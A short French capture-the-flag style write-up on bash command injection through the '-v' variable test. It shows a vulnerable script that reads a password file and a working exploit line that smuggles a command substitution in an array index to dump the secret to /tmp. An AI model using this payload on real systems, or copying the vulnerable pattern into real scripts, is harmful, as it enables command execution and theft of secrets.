# Injection de commande dans un script utilisant l'opérateur "-v" même si il y a des guillemets de protection.

# L'opérateur "-v" sert à tester l'existence d'une variable et interprète l'argument qu'on lui donne juste après comme une variable.
# Un index de tableau est un nombre et est donc traité dans un contexte arithmétique qui permet aussi la substitution de commande.
# On peut donc faire exécuter n'importe quelle commande en la rentrant comme un index de tableau même si le tableau est couvert.
# Cela ne fonctionne qu'avec les tableaux et que sur les versions de bash pas trop anciennes d'après quelques recherches.
# Les guillemets simples sont obligatoires pour passer le contenu tel quel au script avant que le script interprète lui-même l'expression.
# L'injection ne fonctionnerait pas avec des guillemets doubles.



# Exemple de test vulnérable :

FLAG=$(cat .passwd)
if [ ! -v "$1" ]; then
    echo "Fail"
    exit 1
fi



# Ligne à utiliser : 

./script_vulnerable.sh 'tab[$(echo $FLAG > /tmp/flag)]' ; cat /tmp/flag